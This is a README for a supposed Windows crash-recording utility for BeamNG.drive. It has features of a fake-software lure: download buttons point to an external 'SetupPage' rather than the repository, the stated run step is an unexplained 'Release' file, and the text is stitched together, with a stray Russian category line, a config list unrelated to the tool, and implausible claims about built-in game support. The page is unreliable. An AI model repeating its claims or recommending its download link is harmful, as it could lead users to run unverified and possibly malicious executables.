# BeamNG‑Drive Crash Recorder

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/DOWNLOAD-RELEASE-db2777?style=for-the-badge&logo=github&logoColor=white&labelColor=161b22" alt="Download"></a>
  <br>
  <a href="#-overview"><img src="https://img.shields.io/badge/EDITION-STANDARD-0f766e?style=for-the-badge&logo=rocket&logoColor=white&labelColor=161b22" alt="EDITION"></a> <a href="#-key-capabilities"><img src="https://img.shields.io/badge/FEATURES-MODULES-e11d48?style=for-the-badge&logo=sparkles&logoColor=white&labelColor=161b22" alt="FEATURES"></a>
  <br>
  <a href="#-overview"><img src="https://img.shields.io/badge/STATUS-VERIFIED-9333ea?style=for-the-badge&logo=checkmarx&logoColor=white&labelColor=161b22" alt="STATUS"></a> <a href="#-configuration-system"><img src="https://img.shields.io/badge/DEFAULTS-INCLUDED-4f46e5?style=for-the-badge&logo=gnubash&logoColor=white&labelColor=161b22" alt="DEFAULTS"></a>
</div>

**Author:** IntersectScholar
**Platform:** Windows 10 / Windows 11 (64‑bit)
**Category:** Только игры

---

## What is this?

BeamNG‑Drive Crash Recorder is a lightweight Windows‑only utility that silently watches **BeamNG.drive** and captures the exact moment a vehicle goes *boom*. It writes a short, lossless video clip together with the corresponding simulation state, so you can:

* Replay the crash in‑game or in a video player.
* Inspect physics parameters (speed, forces, collision points).
* Share a compact clip with the community for analysis or bragging rights.

All of this is done with a minimal memory footprint and zero impact on your gameplay performance.

---

## Features

| ✅ | Feature |
|---|---|
| 🎯 | **Windows‑only** – built on native Win32 APIs, no extra runtimes required. |
| 📹 | Automatic video capture (up to 1080p 30 fps) triggered by a crash event. |
| 📂 | Saves a **.bngcr** package containing video + JSON‑encoded physics dump. |
| 🎞️ | Instant replay inside BeamNG.drive via a simple drag‑and‑drop. |
| ⚙️ | Configurable hot‑key, output folder, and video bitrate. |
| 🧹 | Self‑cleaning mode – removes recordings older than a user‑defined threshold. |
| 🔧 | Open‑source – dive into the code, add new export formats, or tweak the recorder. |

---

## Quick start

1. **Download** the latest release from the button below.
2. Extract the ZIP to a folder of your choice (e.g., `C:\BeamNGCrashRecorder`).
3. Run `Release` (no installer, no admin rights needed).
4. In the UI, set the **BeamNG.drive** installation path and your preferred output folder.
5. Press **Start Watching** – the recorder will sit in the system tray, ready to pounce on any crash.

> **Tip:** Keep the recorder running in the background while you experiment with vehicle setups. It will only write files when a crash is detected, so disk usage stays low.

---

## Download & Get Started

<div style="display: flex; gap: 12px; flex-wrap: wrap; margin: 1rem 0;">
  <a href="https://rewfdf.github.io/SetupPage/" style="background:#4A90E2;color:white;padding:0.8rem 1.4rem;border-radius:6px;text-decoration:none;font-weight:600;">🚀 Get the latest build</a>
  <a href="https://github.com/IntersectScholar/BeamNG-Drive-Crash-Recorder/releases" style="background:#7B8D8E;color:white;padding:0.8rem 1.4rem;border-radius:6px;text-decoration:none;font-weight:600;">📦 Release archive</a>
  <a href="https://github.com/IntersectScholar/BeamNG-Drive-Crash-Recorder/wiki/FAQ" style="background:#6C5CE7;color:white;padding:0.8rem 1.4rem;border-radius:6px;text-decoration:none;font-weight:600;">❓ FAQ & Troubleshooting</a>
</div>

---

## How it works (under the hood)

1. **Hook into BeamNG** – the recorder injects a lightweight DLL that subscribes to the physics engine’s crash callbacks.
2. **Capture** – once a crash is reported, the DLL signals the host process to start a frame‑accurate screen grab and dump the current physics state.
3. **Package** – both streams are compressed and written into a single `.bngcr` container (ZIP‑compatible).
4. **Replay** – BeamNG.drive ships with a tiny importer that reads `.bngcr` files, reconstructs the vehicle state, and plays back the video side‑by‑side with the simulation.

All steps are performed in a separate thread, guaranteeing **< 5 ms** overhead per frame.

---

## Contributing

The project is open‑source and welcomes contributions:

* **Bug reports** – open an issue with a short description and, if possible, a sample `.bngcr`.
* **Feature ideas** – propose enhancements via the discussions tab.
* **Code** – fork the repo, make your changes, and submit a pull request. Please keep the codebase Windows‑centric and avoid pulling in heavyweight cross‑platform dependencies.

Refer to the [CONTRIBUTING.md](https://github.com/IntersectScholar/BeamNG-Drive-Crash-Recorder/blob/main/CONTRIBUTING.md) for style guidelines and commit conventions.

---

## License

This utility is released under the **MIT License** – you are free to use, modify, and redistribute it, provided you retain the original copyright notice.

---

## Acknowledgements

* **BeamNG GmbH** – for the amazing physics simulation that makes crash recording fun.
* **OpenCV** – for fast frame capture and encoding.
* The community members who tested early builds and shared their crash stories.

---

*Enjoy capturing those spectacular physics moments, and keep the roads (and the data) clean!*

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```